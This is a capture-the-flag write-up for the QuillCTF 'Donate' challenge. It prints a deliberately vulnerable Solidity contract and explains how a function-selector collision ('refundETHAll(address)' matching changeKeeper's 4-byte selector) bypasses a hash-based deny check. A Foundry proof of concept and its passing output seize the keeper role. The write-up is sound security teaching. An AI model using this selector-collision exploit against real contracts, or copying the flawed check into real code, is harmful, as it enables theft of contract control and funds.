# QuillCTF : Donate

## Objective of CTF

Initially, you are a hacker. Not the owner or the keeper of Donate contract.
The purpose is to call keeperCheck() Function and get true;

### Contract code
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

contract Donate {
    event t1(bytes _sig);
    address payable public keeper;
    address public owner;
    event newDonate(address indexed, uint amount);

    modifier onlyOwner() {
        require(
            msg.sender == owner || msg.sender == address(this),
            "You are not Owner"
        );
        _;
    }

    constructor(address _keeper) {
        keeper = payable(_keeper);
        owner = msg.sender;
    }

    function pay() external payable {
        keeper.transfer(msg.value);
        emit newDonate(msg.sender, msg.value);
    }

    function changeKeeper(address _newKeeper) external onlyOwner {
        keeper = payable(_newKeeper);
    }

    function secretFunction(string memory f) external {
        require(
            keccak256(bytes(f)) !=
                0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428,
            "invalid"
        );
        (bool success, ) = address(this).call(
            abi.encodeWithSignature(f, msg.sender)
        );
        require(success, "call fail");
    }

    function keeperCheck() external view returns (bool) {
        return (msg.sender == keeper);
    }
}
```

### Foundry setup
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/donate.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
        console.log("keeper2 - ", donate.keeper());
    }

function testhack() public {
    vm.startPrank(hacker);
		// Hack Time


    }
}
```

Our goal is to call `keeperCheck()` as hacker return true, so we have to become the keeper

There's a `changeKeeper()` function which can change the keeper address, however it has the onlyOwner modifier, but the onlyOwner modifier not only allow the owner, but also allow the contract itself

There's a `secretFunction()` which allows us to call the contract on behalf of the contract itself, it takes a string argument `f` which will be the function selector and `msg.sender` as the argument

However there's a require statement to prevent us from calling `changeKeeper()` with it :
```solidity
        require(
            keccak256(bytes(f)) !=
                0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428,
            "invalid"
        );
```

That hash is the keccak256 hash of the function signature of `changeKeeper()` :
```
➜ keccak256(bytes("changeKeeper(address)"))
Type: bytes32
└ Data: 0x097798381ee91bee7e3420f37298fe723a9eedeade5440d4b2b5ca3192da2428
```

However a function selector only contains the first 4 bytes of that hash, so we can just find another string that has a function signature same as `changeKeeper()`

We can try to bruteforce, but that's gonna take some time, so I tried to search for the signature in Ethereum Signature Database :
https://www.4byte.directory/signatures/?bytes4_signature=0x09779838

It shows that `refundETHAll(address)` also has the function signature of `0x09779838`, same as `changeKeeper()`

So we can just pass `refundETHAll(address)` as the argument `f` and call `secretFunction()` which will call `changeKeeper()` and we will become the keeper

## Proof of concept

### Foundry test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/donate.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
        console.log("keeper2 - ", donate.keeper());
    }

function testhack() public {
    vm.startPrank(hacker);
    // Hack Time
    donate.secretFunction("refundETHAll(address)");
    
    assertTrue(donate.keeperCheck());
    }
}
```

### Foundry test output

```
# forge test --match-path test/Donate.t.sol -vv
[⠔] Compiling...
No files changed, compilation skipped

Running 1 test for test/Donate.t.sol:donateHack
[PASS] testhack() (gas: 20505)
Logs:
  keeper2 -  0xC3f2c61C4836Afeb9Ae601c91F6FE661df3D634E

Test result: ok. 1 passed; 0 failed; finished in 1.03ms
```